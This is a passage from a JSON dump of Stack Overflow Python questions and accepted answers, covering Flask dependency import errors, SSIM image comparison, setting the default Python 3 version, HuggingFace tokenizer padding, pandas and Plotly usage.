    "AcceptedAnswer": "entry_points = {\n    'console_scripts': [\n        'rackfocus=rackfocus.run:main'\n    ]\n}\n\nThis tells the packaging system to create a wrapper executable named rackfocus. That executable will automatically handle all the necessary steps to get Python off the ground, find the run module in the rackfocus package, find its main function and call it.\nYou run the executable like rackfocus (if you are using a virtual environment, it should be on the path already), not python -m rackfocus.\nUsing python -m rackfocus is completely unrelated to that (it doesn't even have anything to do with packaging, and can easily be used with code that hasn't been installed yet). It doesn't use the wrapper; instead, it simply attempts to execute the rackfocus module. But in your case, rackfocus isn't a module; it's a package. The error message means exactly what it says.\nYou would want python -m rackfocus.run to execute the run module - but of course, that still doesn't actually call main() (just like it wouldn't with python rackfocus/main.py - though the -m approach is more powerful; in particular, it allows your relative imports to work).\nThe error message says rackfocus.__main__ because you can make a package runnable by giving it a __main__ module.\n"
}
{
    "Id": 71189819,
    "PostTypeId": 1,
    "Title": "ImportError: cannot import name 'json' from itsdangerous",
    "Body": "I am trying to get a Flask and Docker application to work but when I try and run it using my docker-compose up command in my Visual Studio terminal, it gives me an ImportError called ImportError: cannot import name 'json' from itsdangerous. I have tried to look for possible solutions to this problem but as of right now there are not many on here or anywhere else. The only two solutions I could find are to change the current installation of MarkupSafe and itsdangerous to a higher version: https://serverfault.com/questions/1094062/from-itsdangerous-import-json-as-json-importerror-cannot-import-name-json-fr and another one on GitHub that tells me to essentially change the MarkUpSafe and itsdangerous installation again https://github.com/aws/aws-sam-cli/issues/3661, I have also tried to make a virtual environment named veganetworkscriptenv to install the packages but that has also failed as well. I am currently using Flask 2.0.0 and Docker 5.0.0 and the error occurs on line eight in vegamain.py.\nHere is the full ImportError that I get when I try and run the program:\nveganetworkscript-backend-1  | Traceback (most recent call last):\nveganetworkscript-backend-1  |   File \"/app/vegamain.py\", line 8, in \nveganetworkscript-backend-1  |     from flask import Flask\nveganetworkscript-backend-1  |   File \"/usr/local/lib/python3.9/site-packages/flask/__init__.py\", line 19, in \nveganetworkscript-backend-1  |     from . import json\nveganetworkscript-backend-1  |   File \"/usr/local/lib/python3.9/site-packages/flask/json/__init__.py\", line 15, in \nveganetworkscript-backend-1  |     from itsdangerous import json as _json\nveganetworkscript-backend-1  | ImportError: cannot import name 'json' from 'itsdangerous' (/usr/local/lib/python3.9/site-packages/itsdangerous/__init__.py)\nveganetworkscript-backend-1 exited with code 1\n\nHere are my requirements.txt, vegamain.py, Dockerfile, and docker-compose.yml files:\nrequirements.txt:\nFlask==2.0.0\nFlask-SQLAlchemy==2.4.4\nSQLAlchemy==1.3.20\nFlask-Migrate==2.5.3\nFlask-Script==2.0.6\nFlask-Cors==3.0.9\nrequests==2.25.0\nmysqlclient==2.0.1\npika==1.1.0\nwolframalpha==4.3.0\n\nvegamain.py:\n# Veganetwork (C) TetraSystemSolutions 2022\n# all rights are reserved.  \n# \n# Author: Trevor R. Blanchard Feb-19-2022-Jul-30-2022\n#\n\n# get our imports in order first\nfrom flask import Flask # <-- error occurs here!!!\n\n# start the application through flask.\napp = Flask(__name__)\n\n# if set to true will return only a \"Hello World\" string.\nDebug = True\n\n# start a route to the index part of the app in flask.\n@app.route('/')\ndef index():\n    if (Debug == True):\n        return 'Hello World!'\n    else:\n        pass\n\n# start the flask app here --->\nif __name__ == '__main__':\n    app.run(debug=True, host='0.0.0.0') \n\nDockerfile:\nFROM python:3.9\nENV PYTHONUNBUFFERED 1\nWORKDIR /app\nCOPY requirements.txt /app/requirements.txt\nRUN pip install -r requirements.txt\nCOPY . /app\n\ndocker-compose.yml:\nversion: '3.8'\nservices:\n  backend:\n    build:\n      context: .\n      dockerfile: Dockerfile\n    command: 'python vegamain.py'\n    ports:\n      - 8004:5000\n    volumes:\n      - .:/app\n    depends_on:\n      - db\n\n#  queue:\n#    build:\n#      context: .\n#      dockerfile: Dockerfile\n#    command: 'python -u consumer.py'\n#    depends_on:\n#      - db\n\n  db:\n    image: mysql:5.7.22\n    restart: always\n    environment:\n      MYSQL_DATABASE: admin\n      MYSQL_USER: root\n      MYSQL_PASSWORD: root\n      MYSQL_ROOT_PASSWORD: root\n    volumes:\n      - .dbdata:/var/lib/mysql\n    ports:\n      - 33069:3306\n\nHow exactly can I fix this code? thank you!\n",
    "AcceptedAnswerId": 71219718,
    "AcceptedAnswer": "I just put itsdangerous==2.0.1 in my requirements.txt .Then updated my virtualenv using pip install -r requirements.txt and then docker-compose up --build . Now everything fine for me. Didnot upgrade the flask version.\n"
}
{
    "Id": 71567315,
    "PostTypeId": 1,
    "Title": "How to get the SSIM comparison score between two images?",
    "Body": "I am trying to calculate the SSIM between corresponding images. For example, an image called 106.tif in the ground truth directory corresponds to a 'fake' generated image 106.jpg in the fake directory.\nThe ground truth directory absolute pathway is /home/pr/pm/zh_pix2pix/datasets/mousebrain/test/B\nThe fake directory absolute pathway is /home/pr/pm/zh_pix2pix/output/fake_B\nThe images inside correspond to each other, like this:\nsee image\nThere are thousands of these images I want to compare on a one-to-one basis. I do not want to compare SSIM of one image to many others. Both the corresponding ground truth and fake images have the same file name, but different extension (i.e. 106.tif and 106.jpg) and I only want to compare them to each other.\nI am struggling to edit available scripts for SSIM comparison in this way. I want to use this one: https://github.com/mostafaGwely/Structural-Similarity-Index-SSIM-/blob/master/ssim.py but other suggestions are welcome. The code is also shown below:\n# Usage:\n#\n# python3 script.py --input original.png --output modified.png\n# Based on: https://github.com/mostafaGwely/Structural-Similarity-Index-SSIM-\n\n# 1. Import the necessary packages\n#from skimage.measure import compare_ssim\nfrom skimage.metrics import structural_similarity as ssim\nimport argparse\nimport imutils\nimport cv2\n\n# 2. Construct the argument parse and parse the arguments\nap = argparse.ArgumentParser()\nap.add_argument(\"-f\", \"--first\", required=True, help=\"Directory of the image that will be compared\")\nap.add_argument(\"-s\", \"--second\", required=True, help=\"Directory of the image that will be used to compare\")\nargs = vars(ap.parse_args())\n\n# 3. Load the two input images\nimageA = cv2.imread(args[\"first\"])\nimageB = cv2.imread(args[\"second\"])\n\n# 4. Convert the images to grayscale\ngrayA = cv2.cvtColor(imageA, cv2.COLOR_BGR2GRAY)\ngrayB = cv2.cvtColor(imageB, cv2.COLOR_BGR2GRAY)\n\n# 5. Compute the Structural Similarity Index (SSIM) between the two\n#    images, ensuring that the difference image is returned\n#(score, diff) = compare_ssim(grayA, grayB, full=True)\n(score, diff) = ssim(grayA, grayB, full=True)\ndiff = (diff * 255).astype(\"uint8\")\n\n# 6. You can print only the score if you want\nprint(\"SSIM: {}\".format(score))\n\nThe use of argparse currently limits me to just one image at a time, but I would ideally like to compare them using a loop across the ground truth and fake directories. Any advice would be appreciated.\n",
    "AcceptedAnswerId": 71567872,
    "AcceptedAnswer": "Here's a working example to compare one image to another. You can expand it to compare multiple at once. Two test input images with slight differences:\n\n\nResults\nHighlighted differences\n\n\nSimilarity score\n\nImage similarity 0.9639027981846681\n\nDifference masks\n\n\n\nCode\nfrom skimage.metrics import structural_similarity\nimport cv2\nimport numpy as np\n\nbefore = cv2.imread('5.jpg')\nafter = cv2.imread('6.jpg')\n\n# Convert images to grayscale\nbefore_gray = cv2.cvtColor(before, cv2.COLOR_BGR2GRAY)\nafter_gray = cv2.cvtColor(after, cv2.COLOR_BGR2GRAY)\n\n# Compute SSIM between two images\n(score, diff) = structural_similarity(before_gray, after_gray, full=True)\nprint(\"Image similarity\", score)\n\n# The diff image contains the actual image differences between the two images\n# and is represented as a floating point data type in the range [0,1] \n# so we must convert the array to 8-bit unsigned integers in the range\n# [0,255] before we can use it with OpenCV\ndiff = (diff * 255).astype(\"uint8\")\n\n# Threshold the difference image, followed by finding contours to\n# obtain the regions of the two input images that differ\nthresh = cv2.threshold(diff, 0, 255, cv2.THRESH_BINARY_INV | cv2.THRESH_OTSU)[1]\ncontours = cv2.findContours(thresh.copy(), cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\ncontours = contours[0] if len(contours) == 2 else contours[1]\n\nmask = np.zeros(before.shape, dtype='uint8')\nfilled_after = after.copy()\n\nfor c in contours:\n    area = cv2.contourArea(c)\n    if area > 40:\n        x,y,w,h = cv2.boundingRect(c)\n        cv2.rectangle(before, (x, y), (x + w, y + h), (36,255,12), 2)\n        cv2.rectangle(after, (x, y), (x + w, y + h), (36,255,12), 2)\n        cv2.drawContours(mask, [c], 0, (0,255,0), -1)\n        cv2.drawContours(filled_after, [c], 0, (0,255,0), -1)\n\ncv2.imshow('before', before)\ncv2.imshow('after', after)\ncv2.imshow('diff',diff)\ncv2.imshow('mask',mask)\ncv2.imshow('filled after',filled_after)\ncv2.waitKey(0)\n\n"
}
{
    "Id": 71034111,
    "PostTypeId": 1,
    "Title": "How to set default python3 to python 3.9 instead of python 3.8 in Ubuntu 20.04 LTS",
    "Body": "I have installed Python 3.9 in the Ubuntu 20.04 LTS. Now the system has both Python 3.8 and Python 3.9.\n# which python\n# which python3\n/usr/bin/python3\n# which python3.8\n/usr/bin/python3.8\n# which python3.9\n/usr/bin/python3.9\n# ls -alith /usr/bin/python3\n12583916 lrwxrwxrwx 1 root root 9 Jul 19  2021 /usr/bin/python3 -> python3.8\n\nBut the pip3 command will still install everything into the Python 3.8 directory.\n# pip3 install --upgrade --find-links file:///path/to/directory \n\nI want to change that default pip3 behavior by updating the symbolic link /usr/bin/python3 to /usr/bin/python3.9.\nHow to do that?\n# update-alternatives --set python3 /usr/bin/python3.9\nThis command will not work as expected.\n\nHere is the pip3 info:\n# which pip3\n/usr/bin/pip3\n# ls -alith /usr/bin/pip3\n12589712 -rwxr-xr-x 1 root root 367 Jul 13  2021 /usr/bin/pip3\n# pip3 -V\npip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.8)\n# \n\nThe alias command will not work:\n# alias python3=python3.9\n# ls -alith /usr/bin/python3\n12583916 lrwxrwxrwx 1 root root 9 Jul 19  2021 /usr/bin/python3 -> python3.8\n\n",
    "AcceptedAnswerId": 71034427,
    "AcceptedAnswer": "You should be able to use python3.9 -m pip install  to run pip with a specific python version, in this case 3.9.\nThe full docs on this are here: https://packaging.python.org/guides/installing-using-pip-and-virtual-environments/\nIf you want python3 to point to python3.9 you could use the quick and dirty.\nalias python3=python3.9\n\nEDIT:\nTried to recreate your problem,\n# which python3\n/usr/bin/python3\n# python3 --version\nPython 3.8.10\n# which python3.8\n/usr/bin/python3.8\n# which python3.9\n/usr/bin/python3.9\n\nThen update the alternatives, and set new priority:\n# sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.9 1\n# sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.9 2\n# sudo update-alternatives --config python3\nThere are 2 choices for the alternative python3 (providing /usr/bin/python3).\n\n  Selection    Path                Priority   Status\n------------------------------------------------------------\n  0            /usr/bin/python3.9   2         auto mode\n  1            /usr/bin/python3.8   2         manual mode\n* 2            /usr/bin/python3.9   2         manual mode\n\nPress  to keep the current choice[*], or type selection number: 0\n\nCheck new version:\n# ls -alith /usr/bin/python3\n3338 lrwxrwxrwx 1 root root 25 Feb  8 14:33 /usr/bin/python3 -> /etc/alternatives/python3\n# python3 -V\nPython 3.9.5\n# ls -alith /usr/bin/pip3\n48482 -rwxr-xr-x 1 root root 367 Jul 13  2021 /usr/bin/pip3\n# pip3 -V\npip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.9)\n\nHope this helps (tried it in wsl2 Ubuntu 20.04 LTS)\n"
}
{
    "Id": 71166789,
    "PostTypeId": 1,
    "Title": "HuggingFace: ValueError: expected sequence of length 165 at dim 1 (got 128)",
    "Body": "I am trying to fine-tune the BERT language model on my own data. I've gone through their docs, but their tasks seem to be not quite what I need, since my end goal is embedding text. Here's my code:\nfrom datasets import load_dataset\nfrom transformers import BertTokenizerFast, AutoModel, TrainingArguments, Trainer\nimport glob\nimport os\n\n\nbase_path = '../data/'\nmodel_name = 'bert-base-uncased'\nmax_length = 512\ncheckpoints_dir = 'checkpoints'\n\ntokenizer = BertTokenizerFast.from_pretrained(model_name, do_lower_case=True)\n\n\ndef tokenize_function(examples):\n    return tokenizer(examples['text'], padding=True, truncation=True, max_length=max_length)\n\n\ndataset = load_dataset('text',\n        data_files={\n            'train': f'{base_path}train.txt',\n            'test': f'{base_path}test.txt',\n            'validation': f'{base_path}valid.txt'\n        }\n)\n\nprint('Tokenizing data. This may take a while...')\ntokenized_dataset = dataset.map(tokenize_function, batched=True)\ntrain_dataset = tokenized_dataset['train']\neval_dataset = tokenized_dataset['test']\n\nmodel = AutoModel.from_pretrained(model_name)\n\ntraining_args = TrainingArguments(checkpoints_dir)\n\nprint('Training the model...')\ntrainer = Trainer(model=model, args=training_args, train_dataset=train_dataset, eval_dataset=eval_dataset)\ntrainer.train()\n\nI get the following error:\n  File \"train_lm_hf.py\", line 44, in \n    trainer.train()\n...\n  File \"/opt/conda/lib/python3.7/site-packages/transformers/data/data_collator.py\", line 130, in torch_default_data_collator\n    batch[k] = torch.tensor([f[k] for f in features])\nValueError: expected sequence of length 165 at dim 1 (got 128)\n\nWhat am I doing wrong?\n",
    "AcceptedAnswerId": 71232059,
    "AcceptedAnswer": "I fixed this solution by changing the tokenize function to:\ndef tokenize_function(examples):\n    return tokenizer(examples['text'], padding='max_length', truncation=True, max_length=max_length)\n\n(note the padding argument). Also, I used a data collator like so:\ndata_collator = DataCollatorForLanguageModeling(\n    tokenizer=tokenizer, mlm=True, mlm_probability=0.15\n)\ntrainer = Trainer(\n        model=model,\n        args=training_args,\n        data_collator=data_collator,\n        train_dataset=train_dataset,\n        eval_dataset=eval_dataset\n)\n\n"
}
{
    "Id": 71544953,
    "PostTypeId": 1,
    "Title": "unreadable Jupyter Lab Notebook after upgrading pandas (Capture Validation Error)",
    "Body": "I was recently using Jupyter lab and decided to update my pandas version from 1.2 to the latest (1.4).  So I ran 'conda update pandas' which seemed to work fine.  However when I then launched Jupyter lab in the usual way 'jupyter lab' and tried to open the workbook I had just been working on I got the below error:\n\nUnreadable Notebook: C:\\Users...\\script.ipynb TypeError(\"init() got an unexpected keyword argument 'capture_validation_error'\")\n\nI am getting this same error when trying to open any of my .ipynb files that were previously working fine.  I can also open them fine in jupyter notebook, but for some reason they don't work in Jupyter lab anymore.  Any idea how I can fix this?\nThanks\n",
    "AcceptedAnswerId": 71595097,
    "AcceptedAnswer": "It turns out that a recent update to jupyter_server>=1.15.0 broke compatibility with nbformat, but did not update the conda recipe correctly per this Github pull request.\nIt is possible that while updating pandas, you may have inadvertently also updated jupyterlab and/or jupyter_server.\nWhile we wait for the build with the merged PR to come downstream, we can fix this dependency issue by updating nbformat manually with\nconda install -c conda-forge nbformat\n\nto get the newest version of nbformat with version >=5.2.\n"
}
{
    "Id": 71078751,
    "PostTypeId": 1,
    "Title": "VS Code Python Formatting: Change max line-length with autopep8 / yapf / black",
    "Body": "I am experimenting with different python formatters and would like to increase the max line length. Ideally without editing the settings.json file. Is there a way to achieve that?\n\n",
    "AcceptedAnswerId": 71078792,
    "AcceptedAnswer": "For all three formatters, the max line length can be increased with additional arguments passed in from settings, i.e.:\n\nautopep8 args: --max-line-length=120\nblack args: --line-length=120\nyapf args: --style={based_on_style: google, column_limit: 120, indent_width: 4}\n\nHope that helps someone in the future!\n\n"
}
{
    "Id": 71132469,
    "PostTypeId": 1,
    "Title": "Appending row to dataframe with concat()",
    "Body": "I have defined an empty data frame with\ndf = pd.DataFrame(columns=['Name', 'Weight', 'Sample'])\n\nand want to append rows in a for loop like this:\nfor key in my_dict:\n   ...\n   row = {'Name':key, 'Weight':wg, 'Sample':sm}\n   df = pd.concat(row, axis=1, ignore_index=True) \n\nBut I get this error\ncannot concatenate object of type ''; only Series and DataFrame objs are valid\n\nIf I use df = df.append(row, ignore_index=True), it works but it seems that append is deprecated. So, I want to use concat(). How can I fix that?\n",
    "AcceptedAnswerId": 71132587,
    "AcceptedAnswer": "You can transform your dict in pandas DataFrame\nimport pandas as pd\ndf = pd.DataFrame(columns=['Name', 'Weight', 'Sample'])\nfor key in my_dict:\n  ...\n  #transform your dic in DataFrame\n  new_df = pd.DataFrame([row])\n  df = pd.concat([df, new_df], axis=0, ignore_index=True)\n\n"
}
{
    "Id": 71271759,
    "PostTypeId": 1,
    "Title": "How to change MarkUpSafe version in virtual environment?",
    "Body": "I am trying to make an application using python and gRPC as shown in this article - link\nI am able to run the app successfully on my terminal but to run with a frontend I need to run it as a flask app, codebase. And I am doing all this in a virtual environment.\nwhen I run my flask command FLASK_APP=marketplace.py flask run\nThis is the error I get\nImportError: cannot import name 'soft_unicode' from 'markupsafe' (/Users/alex/Desktop/coding/virt/lib/python3.8/site-packages/markupsafe/__init__.py)\n\nOn researching about this error I found this link - it basically tells us that currently I am using a higher version of MarkUpSafe library than required.\nSo I did pip freeze --local  inside the virtualenv and got MarkUpSafe version to be MarkupSafe==2.1.0\nI think if I change the version of this library from 2.1.0 to 2.0.1 then the flask app might run.\nHow can I change this library's version from the terminal?\nPS: If you think changing the version of the library won't help in running the flask app, please let me know what else can I try in this.\n",
    "AcceptedAnswerId": 71274080,
    "AcceptedAnswer": "If downgrading will solve the issue for you try the following code inside your virtual environment.\npip install MarkupSafe==2.0.1\n"
}
{
    "Id": 71106940,
    "PostTypeId": 1,
    "Title": "Cannot import name '_centered' from 'scipy.signal.signaltools'",
    "Body": "Unable to import functions from scipy module.\nGives error :\nfrom scipy.signal.signaltools import _centered\nCannot import name '_centered' from 'scipy.signal.signaltools'\n\nscipy.__version__\n1.8.0\n\n",
    "AcceptedAnswerId": 71285979,
    "AcceptedAnswer": "If you need to use that specific version of statsmodels 0.12.x with scipy 1.8.0 I have the following hack.\nBasically it just re-publishes the existing (but private) _centered function as a public attribute to the module already imported in RAM.\nIt is a workaround, and if you can simply upgrade your dependencies to the latest versions. Only use this if you are forced to use those specific versions.\nimport  scipy.signal.signaltools\n\ndef _centered(arr, newsize):\n    # Return the center newsize portion of the array.\n    newsize = np.asarray(newsize)\n    currsize = np.array(arr.shape)\n    startind = (currsize - newsize) // 2\n    endind = startind + newsize\n    myslice = [slice(startind[k], endind[k]) for k in range(len(endind))]\n    return arr[tuple(myslice)]\n\nscipy.signal.signaltools._centered = _centered\n\n"
}
{
    "Id": 71652965,
    "PostTypeId": 1,
    "Title": "ImportError: cannot import name 'safe_str_cmp' from 'werkzeug.security'",
    "Body": "Any ideas on why I get this error?\nMy project was working fine. I copied it to an external drive and onto my laptop to work on the road; it worked fine. I copied it back to my desktop and had a load of issues with invalid interpreters etc, so I made a new project and copied just the scripts in, made a new requirements.txt and installed all the packages, but when I run it, I get this error:\nTraceback (most recent call last):\n  File \"E:\\Dev\\spot_new\\flask_blog\\run.py\", line 1, in \n    from flaskblog import app\n  File \"E:\\Dev\\spot_new\\flask_blog\\flaskblog\\__init__.py\", line 3, in \n    from flask_bcrypt import Bcrypt\n  File \"E:\\Dev\\spot_new\\venv\\lib\\site-packages\\flask_bcrypt.py\", line 21, in \n    from werkzeug.security import safe_str_cmp\nImportError: cannot import name 'safe_str_cmp' from 'werkzeug.security' (E:\\Dev\\spot_new\\venv\\lib\\site-packages\\werkzeug\\security.py)\n\nI've tried uninstalling Python, Anaconda, PyCharm, deleting every reg key and environment variable I can find that looks pythonic, reinstalling all from scratch but still no dice.\n",
    "AcceptedAnswerId": 71653849,
    "AcceptedAnswer": "Werkzeug released v2.1.0 today, removing werkzeug.security.safe_str_cmp.\nYou can probably resolve this issue by pinning Werkzeug~=2.0.0 in your requirements.txt file (or similar).\npip install Werkzeug~=2.0.0\n\nAfter that it is likely that you will also have an AttributeError related to the jinja package, so if you have it, also run:\npip install jinja2~=3.0.3\n\n"
}
{
    "Id": 71121056,
    "PostTypeId": 1,
    "Title": "Plotly Python update figure with dropMenu",
    "Body": "i am currently working with plotly i have a function called plotChart that takes a dataframe as input and plots a candlestick chart. I am trying to figure out a way to pass a list of dataframes  to the function plotChart and use a plotly dropdown menu to show the options on the input list by the stock name. The drop down menu will have the list of dataframe and when an option is clicked on it will update the figure in plotly is there away to do this. below is the code i have to plot a single dataframe\ndef make_multi_plot(df):\n    \n    fig = make_subplots(rows=2, cols=2,\n                        shared_xaxes=True,\n                        vertical_spacing=0.03,\n                        subplot_titles=('OHLC', 'Volume Profile'),\n                        row_width=[0.2, 0.7])\n\n    for s in df.name.unique():\n        \n        trace1 = go.Candlestick(\n            x=df.loc[df.name.isin([s])].time,\n            open=df.loc[df.name.isin([s])].open,\n            high=df.loc[df.name.isin([s])].high,\n            low=df.loc[df.name.isin([s])].low,\n            close=df.loc[df.name.isin([s])].close,\n            name = s)\n        fig.append_trace(trace1,1,1)\n        \n        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].BbandsMid, mode='lines',name='MidBollinger'),1,1)\n        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].BbandsUpp, mode='lines',name='UpperBollinger'),1,1)\n        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].BbandsLow, mode='lines',name='LowerBollinger'),1,1)\n        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].vwap, mode='lines',name='VWAP'),1,1)\n        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].STDEV_1, mode='lines',name='UPPERVWAP'),1,1)\n        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].STDEV_N1, mode='lines',name='LOWERVWAP'),1,1)\n        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].KcMid, mode='lines',name='KcMid'),1,1)\n        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].KcUpper, mode='lines',name='KcUpper'),1,1)\n        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].KcLow, mode='lines',name='KcLow'),1,1)\n        \n\n        trace2 = go.Bar(\n                x=df.loc[df.name.isin([s])].time,\n                y=df.loc[df.name.isin([s])].volume,\n                name = s)\n        fig.append_trace(trace2,2,1)\n        # fig.update_layout(title_text=s)\n        \n        \n        \n    graph_cnt=len(fig.data)\n\n        \n    tr = 11\n    symbol_cnt =len(df.name.unique())\n    for g in range(tr, graph_cnt):\n        fig.update_traces(visible=False, selector=g)\n        #print(g)\n    def create_layout_button(k, symbol):\n        \n        start, end = tr*k, tr*k+2\n        visibility = [False]*tr*symbol_cnt\n        visibility[start:end] = [True,True,True,True,True,True,True,True,True,True,True]\n        return dict(label = symbol,\n                    method = 'restyle',\n                    args = [{'visible': visibility[:-1],\n                             'title': symbol,\n                             'showlegend': False}])    \n    \n    fig.update(layout_xaxis_rangeslider_visible=False)\n    fig.update_layout(\n        updatemenus=[go.layout.Updatemenu(\n            active = 0,\n            buttons = [create_layout_button(k, s) for k, s in enumerate(df.name.unique())]\n            )\n        ])\n    \n    fig.show()\n\ni am trying to add annotations to the figure it will be different for each chart below is how i had it setup for the single chart df['superTrend'] is a Boolean column\nfor i in range(df.first_valid_index()+1,len(df.index)):\n        prev = i - 1\n        if df['superTrend'][i] != df['superTrend'][prev] and not np.isnan(df['superTrend'][i]) :\n            #print(i,df['inUptrend'][i])\n            fig.add_annotation(x=df['time'][i], y=df['open'][i],\n            text= 'Buy' if df['superTrend'][i] else 'Sell',\n            showarrow=True,\n            arrowhead=6,\n            font=dict(\n                #family=\"Courier New, monospace\",\n                size=20,\n                #color=\"#ffffff\"\n            ),)\n\n",
    "AcceptedAnswerId": 71155096,
    "AcceptedAnswer": "I adapted an example from the plotly community to your example and created the code. The point of creation is to create the data for each subplot and then switch between them by means of buttons. The sample data is created using representative companies of US stocks. one issue is that the title is set but not displayed. We are currently investigating this issue.\nimport yfinance as yf\nimport plotly.graph_objects as go\nfrom plotly.subplots import make_subplots\nimport pandas as pd\n\nsymbols = ['AAPL','GOOG','TSLA']\nstocks = pd.DataFrame()\nfor s in symbols:\n    data = yf.download(s, start=\"2021-01-01\", end=\"2021-12-31\")\n    data['mean'] = data['Close'].rolling(20).mean()\n    data['std'] = data['Close'].rolling(20).std()\n    data['upperBand'] = data['mean'] + (data['std'] * 2)\n    data.reset_index(inplace=True)\n    data['symbol'] = s\n    stocks = stocks.append(data, ignore_index=True)\n\ndef make_multi_plot(df):\n    \n    fig = make_subplots(rows=2, cols=1,\n                        shared_xaxes=True,\n                        vertical_spacing=0.03,\n                        subplot_titles=('OHLC', 'Volume Profile'),\n                        row_width=[0.2, 0.7])\n\n    for s in df.symbol.unique():\n        trace1 = go.Candlestick(\n            x=df.loc[df.symbol.isin([s])].Date,\n            open=df.loc[df.symbol.isin([s])].Open,\n            high=df.loc[df.symbol.isin([s])].High,\n            low=df.loc[df.symbol.isin([s])].Low,\n            close=df.loc[df.symbol.isin([s])].Close,\n            name=s)\n        fig.append_trace(trace1,1,1)\n        \n        trace2 = go.Scatter(\n            x=df.loc[df.symbol.isin([s])].Date,\n            y=df.loc[df.symbol.isin([s])].upperBand,\n            name=s)\n        fig.append_trace(trace2,1,1)\n        \n        trace3 = go.Bar(\n            x=df.loc[df.symbol.isin([s])].Date,\n            y=df.loc[df.symbol.isin([s])].Volume,\n            name=s)\n        fig.append_trace(trace3,2,1)\n        # fig.update_layout(title_text=s)\n    \n    # Calculate the total number of graphs\n    graph_cnt=len(fig.data)\n    # Number of Symbols\n    symbol_cnt =len(df.symbol.unique())\n    # Number of graphs per symbol\n    tr = 3\n    # Hide setting for initial display\n    for g in range(tr, graph_cnt): \n        fig.update_traces(visible=False, selector=g)\n\n    def create_layout_button(k, symbol):\n        start, end = tr*k, tr*k+2\n        visibility = [False]*tr*symbol_cnt\n        # Number of graphs per symbol, so if you add a graph, add True.\n        visibility[start:end] = [True,True,True]\n        return dict(label = symbol,\n                    method = 'restyle',\n                    args = [{'visible': visibility[:-1],\n                             'title': symbol,\n                             'showlegend': True}])    \n    \n    fig.update(layout_xaxis_rangeslider_visible=False)\n    fig.update_layout(\n        updatemenus=[go.layout.Updatemenu(\n            active = 0,\n            buttons = [create_layout_button(k, s) for k, s in enumerate(df.symbol.unique())]\n            )\n        ])\n    \n    fig.show()\n    return fig.layout\n    \nmake_multi_plot(stocks)\n\n\n\n\n"
}
{
    "Id": 71193085,
    "PostTypeId": 1,
    "Title": "Creating nested columns in python dataframe",
    "Body": "I have 3 columns namely Models(should be taken as index), Accuracy without normalization, Accuracy with normalization (zscore, minmax, maxabs, robust) and these are required to be created as:\n ------------------------------------------------------------------------------------\n|   Models  |  Accuracy without normalization    |      Accuracy with normalization  |\n|           |                                    |-----------------------------------|\n|           |                                    | zscore | minmax | maxabs | robust |\n ------------------------------------------------------------------------------------\n\n\ndfmod-> Models column\ndfacc-> Accuracy without normalization\ndfacc1-> Accuracy with normalization - zscore\ndfacc2-> Accuracy with normalization - minmax\ndfacc3-> Accuracy with normalization - maxabs\ndfacc4-> Accuracy with normalization - robust\n\ndfout=pd.DataFrame({('Accuracy without Normalization'):{dfacc},\n     ('Accuracy using Normalization','zscore'):{dfacc1},\n     ('Accuracy using Normalization','minmax'):{dfacc2},\n     ('Accuracy using Normalization','maxabs'):{dfacc3},\n     ('Accuracy using Normalization','robust'):{dfacc4},\n   },index=dfmod\n)\n\nI was trying to do something like this but i can't figure out any further\nTest data:\nqda    0.6333       0.6917      0.5917      0.6417     0.5833\nsvm    0.5333       0.6917      0.5333      0.575      0.575\nlda    0.5333       0.6583      0.5333      0.5667     0.5667\nlr     0.5333       0.65        0.4917      0.5667     0.5667\ndt     0.5333       0.65        0.4917      0.5667     0.5667\nrc     0.5083       0.6333      0.4917      0.525      0.525\nnb     0.5          0.625       0.475       0.5        0.4833\nrfc    0.5          0.625       0.4417      0.4917     0.4583\nknn    0.3917       0.6         0.4417      0.4833     0.45\net     0.375        0.5333      0.4333      0.4667     0.45\ndc     0.375        0.5333      0.4333      0.4667     0.425\nqds    0.3417       0.5333      0.4         0.4583     0.3667\nlgt    0.3417       0.525       0.3917      0.45       0.3583\nlt     0.2333       0.45        0.3917      0.4167     0.3417\n\nThese are values for respective subcolumns in order specified in the table above\n",
    "AcceptedAnswerId": 71194341,
    "AcceptedAnswer": "There's a dirty way to do this, I'll write about it till someone answers with a better idea. Here we go:\nimport pandas as pd\n\n# I assume that you can read raw data named test.csv by pandas and\n# set header = None cause you mentioned the Test data without any headers, so:\ndf = pd.read_csv(\"test.csv\", header = None)\n\n# Then define preferred Columns! \nMyColumns = pd.MultiIndex.from_tuples([(\"Models\" , \"\"),\n                                       (\"Accuracy without normalization\" , \"\"),\n                                       (\"Accuracy with normalization\" , \"zscore\"),\n                                       (\"Accuracy with normalization\" , \"minmax\"),\n                                       (\"Accuracy with normalization\" , \"maxabs\"),\n                                       (\"Accuracy with normalization\" , \"robust\")])\n\n# Create new DataFrame with specified Columns, after this you should pass values \nNew_DataFrame = pd.DataFrame(df , columns = MyColumns)\n\n# a loop for passing values\nfor item in range(len(MyColumns)):\n    New_DataFrame.loc[: , MyColumns[item]] = df.iloc[: , item]\n\nThis gives me:\n\nafter all, if you want to set Models as the index of New_DataFrame, You can continue with:\nNew_DataFrame.set_index(New_DataFrame.columns[0][0] , inplace=True)\nNew_DataFrame\n\nThis gives me:\n\n"
}
{
    "Id": 71575112,
    "PostTypeId": 1,
    "Title": "Annotate a function argument as being a specific module",
